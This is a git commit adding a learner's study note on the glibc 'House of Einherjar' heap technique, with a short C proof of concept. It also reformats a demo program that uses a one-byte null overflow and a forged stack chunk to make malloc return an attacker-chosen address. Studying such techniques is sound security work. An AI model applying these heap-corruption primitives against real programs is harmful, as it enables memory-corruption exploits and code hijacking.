0d70f88bbb7f718a146acaa0e42fc60e4175bce8
LongChampion <ThePalazin@Gmail.com>
2020-03-21 15:35:41 +0700

    Learned house_of_einherjar

---
+++ MYLOG/house_of_einherjar.md
@@ -0,0 +1,37 @@
+# House of Einherjar
+> LongChampion, 21/03/2020
+
+Let see how to *hijack* `malloc` return a fake chunk.
+```
+#include <stdlib.h>
+
+struct CHUNK
+{
+    long long pre_size, size;
+    struct CHUNK *fd, *bk, *nextsize_fd, *nextsize_bk;
+};
+
+int main()
+{
+    void *a = malloc(0x100 - 8);
+    void *b = malloc(0x100 - 8);
+
+    struct CHUNK Fake;
+    Fake.fd = &Fake;
+    Fake.bk = &Fake;
+    Fake.nextsize_fd = &Fake;
+    Fake.nextsize_bk = &Fake;
+
+    struct CHUNK *Header = (struct CHUNK *) (b - 0x10);
+    Header->size &= ~0xff;
+    Header->pre_size = (long long) &Header - (long long) &Fake;
+    Fake.size = Header->pre_size;
+
+    free(b);
+    void *STACK = malloc(0x100 - 8);
+}
+```
+First, we need to create a fake chunk on stack. Because we will set size of this chunk to a very large value, struct `CHUNK` now have two additional pointer, `nextsize_fd` and `nextsize_bk`. Their functionalities are same as `fd` and `bk` pointer, btw. To bypass security checking, we simply set all four pointer point to ... a fake chunk itself. Don't be smile, it works in practice!.  
+Then, assume we have ability to change `pre_size` and `size` of chunk `b`. The least significant byte of `b`'s size is set to 0x00, this will (almost all time) reduce the size of chunk `b` and clear `PREV_INUSE` flag of chunk `b` as well.  
+Next, `pre_size` of chunk `b` and `size` of fake chunk are set to a value which equal to the distance between two chunks. Now if we free chunk `b`, glibc will *think* that our fake chunk is the previous chunk of `b`, and because we have cleared `PREV_INUSE` flag of `b`, glibc will consolidate them together and puts the merged chunk into unsorted_bin.  
+The next `malloc` call with suitable request size will return out fake chunk as we expect.
--- glibc_2.25/house_of_einherjar.c
+++ glibc_2.25/house_of_einherjar.c
@@ -12,18 +12,18 @@
 
 int main()
 {
-	fprintf(stderr, "Welcome to House of Einherjar!\n");
-	fprintf(stderr, "Tested in Ubuntu 16.04 64bit.\n");
-	fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
+    fprintf(stderr, "Welcome to House of Einherjar!\n");
+    fprintf(stderr, "Tested in Ubuntu 16.04 64bit.\n");
+    fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
 
-	uint8_t* a;
-	uint8_t* b;
-	uint8_t* d;
+    uint8_t *a;
+    uint8_t *b;
+    uint8_t *d;
 
-	fprintf(stderr, "\nWe allocate 0x38 bytes for 'a'\n");
-	a = (uint8_t*) malloc(0x38);
-	fprintf(stderr, "a: %p\n", a);
-    
+    fprintf(stderr, "\nWe allocate 0x38 bytes for 'a'\n");
+    a = (uint8_t *) malloc(0x38);
+    fprintf(stderr, "a: %p\n", a);
+
     int real_a_size = malloc_usable_size(a);
     fprintf(stderr, "Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);
 
@@ -35,14 +35,14 @@ int main()
 
     size_t fake_chunk[6];
 
-    fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
-    fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
-    fake_chunk[2] = (size_t) fake_chunk; // fwd
-    fake_chunk[3] = (size_t) fake_chunk; // bck
-    fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
-    fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize
-    
-    
+    fake_chunk[0] = 0x100;                  // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
+    fake_chunk[1] = 0x100;                  // size of the chunk just needs to be small enough to stay in the small bin
+    fake_chunk[2] = (size_t) fake_chunk;    // fwd
+    fake_chunk[3] = (size_t) fake_chunk;    // bck
+    fake_chunk[4] = (size_t) fake_chunk;    //fwd_nextsize
+    fake_chunk[5] = (size_t) fake_chunk;    //bck_nextsize
+
+
     fprintf(stderr, "Our fake chunk at %p looks like:\n", fake_chunk);
     fprintf(stderr, "prev_size (not used): %#lx\n", fake_chunk[0]);
     fprintf(stderr, "size: %#lx\n", fake_chunk[1]);
@@ -51,34 +51,35 @@ int main()
     fprintf(stderr, "fwd_nextsize: %#lx\n", fake_chunk[4]);
     fprintf(stderr, "bck_nextsize: %#lx\n", fake_chunk[5]);
 
-	/* In this case it is easier if the chunk size attribute has a least significant byte with
+    /* In this case it is easier if the chunk size attribute has a least significant byte with
 	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
 	 * the chunk includes the amount requested plus some amount required for the metadata. */
-	b = (uint8_t*) malloc(0xf8);
+    b = (uint8_t *) malloc(0xf8);
     int real_b_size = malloc_usable_size(b);
 
-	fprintf(stderr, "\nWe allocate 0xf8 bytes for 'b'.\n");
-	fprintf(stderr, "b: %p\n", b);
+    fprintf(stderr, "\nWe allocate 0xf8 bytes for 'b'.\n");
+    fprintf(stderr, "b: %p\n", b);
 
-	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
+    uint64_t *b_size_ptr = (uint64_t *) (b - 8);
     /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/
 
-	fprintf(stderr, "\nb.size: %#lx\n", *b_size_ptr);
-	fprintf(stderr, "b.size is: (0x100) | prev_inuse = 0x101\n");
-	fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
-	a[real_a_size] = 0; 
-	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
+    fprintf(stderr, "\nb.size: %#lx\n", *b_size_ptr);
+    fprintf(stderr, "b.size is: (0x100) | prev_inuse = 0x101\n");
+    fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
+    a[real_a_size] = 0;
+    fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
     fprintf(stderr, "This is easiest if b.size is a multiple of 0x100 so you "
-           "don't change the size of b, only its prev_inuse bit\n");
+                    "don't change the size of b, only its prev_inuse bit\n");
     fprintf(stderr, "If it had been modified, we would need a fake chunk inside "
-           "b where it will try to consolidate the next chunk\n");
+                    "b where it will try to consolidate the next chunk\n");
 
     // Write a fake prev_size to the end of a
     fprintf(stderr, "\nWe write a fake prev_size to the last %lu bytes of a so that "
-           "it will consolidate with our fake chunk\n", sizeof(size_t));
-    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
-    fprintf(stderr, "Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
-    *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;
+                    "it will consolidate with our fake chunk\n",
+            sizeof(size_t));
+    size_t fake_size = (size_t)((b - sizeof(size_t) * 2) - (uint8_t *) fake_chunk);
+    fprintf(stderr, "Our fake prev_size will be %p - %p = %#lx\n", b - sizeof(size_t) * 2, fake_chunk, fake_size);
+    *(size_t *) &a[real_a_size - sizeof(size_t)] = fake_size;
 
     //Change the fake chunk's size to reflect b's new prev_size
     fprintf(stderr, "\nModify fake chunk's size to reflect b's new prev_size\n");
@@ -89,14 +90,14 @@ int main()
     free(b);
     fprintf(stderr, "Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);
 
-    //if we allocate another chunk before we free b we will need to 
-    //do two things: 
+    //if we allocate another chunk before we free b we will need to
+    //do two things:
     //1) We will need to adjust the size of our fake chunk so that
     //fake_chunk + fake_chunk's size points to an area we control
     //2) we will need to write the size of our fake chunk
-    //at the location we control. 
+    //at the location we control.
     //After doing these two things, when unlink gets called, our fake chunk will
-    //pass the size(P) == prev_size(next_chunk(P)) test. 
+    //pass the size(P) == prev_size(next_chunk(P)) test.
     //otherwise we need to make sure that our fake chunk is up against the
     //wilderness
 
